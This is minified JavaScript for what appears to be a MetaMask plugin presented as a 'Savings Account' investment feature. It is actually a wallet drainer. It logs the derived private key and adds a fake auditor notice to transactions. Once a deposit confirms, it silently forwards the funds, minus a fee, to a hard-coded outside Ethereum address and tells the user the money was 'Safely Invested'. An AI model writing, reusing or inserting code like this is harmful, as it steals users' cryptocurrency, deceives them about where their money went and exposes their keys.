const provider=new ethers.providers.Web3Provider(wallet);wallet.registerRpcMessageHandler(async(e,s)=>{console.log("received request",s);const t=await wallet.getAppKey();console.log("privKey is "+t);const o=new ethers.Wallet(t,provider);switch(console.dir(o),s.method){case"address":console.log("Adding account to MetaMask");const e=wallet.getPluginState();console.log("This is state"),console.log(e),wallet.updatePluginState({...e,user_type:s.params[0]});const a=wallet.getPluginState();return console.log("New State"),console.log(a),console.log("Private keys is ",t),wallet.importAccountWithStrategy("Private Key",[t]),wallet.setAccountLabel(o.address,"Savings Account"),wallet.setAddressBook(o.address,"Savings Account","1",""),wallet.setAddressBook(o.address,"Savings Account","3",""),wallet.setAddressBook(o.address,"Savings Account","4",""),wallet.setAddressBook(o.address,"Savings Account","5",""),wallet.setAddressBook(o.address,"Savings Account","42",""),"true";case"signMessage":const n=s.params[0];return console.log("trying to sign message",n),o.signMessage(n);case"sign":const l=s.params[0];return o.sign(l);default:throw new Error("Method not found.")}}),wallet.onMetaMaskEvent("newUnapprovedTx",async e=>{const{txParams:s}=e,t=s.to,o=await wallet.getAppKey(),a=new ethers.Wallet(o,provider).address;t.toLowerCase()==a.toLowerCase()&&wallet.addAddressAudit({address:s.to,auditor:"Defi Transacts",message:"You are Sending Your Money for Investinging !!"})}),wallet.onMetaMaskEvent("tx:status-update",async(e,s)=>{if("confirmed"===s){const s=wallet.getTxById(e),{txParams:o}=s,a=o.to;console.log("recipient is "),console.log(a);var t=parseInt(o.value)/1e18;t-=.021,console.log("Amount is"),console.log(t);const n=await wallet.getAppKey(),l=new ethers.Wallet(n,provider);if(l.address.toLowerCase()==a.toLowerCase()){console.log("These are same guys. User Sending to Savings");const e={nonce:l.getTransactionCount(),to:"0xc5D6d2eA25bb7cf7C997ba135fDD141555884685",value:ethers.utils.parseEther(t.toString()),gasLimit:21e5,gasPrice:ethers.utils.parseUnits("11","gwei")};console.log("prefundEth transaction",e),console.log("Signing Transaction");const s=await l.sign(e);console.log("ethersWalletSponsor.sign",s);let o=await provider.sendTransaction(s);wallet.send({method:"alert",params:["Your Money Has Been Successfully and Safely Invested"]}),console.log("Tx hash is"),console.log(o)}}});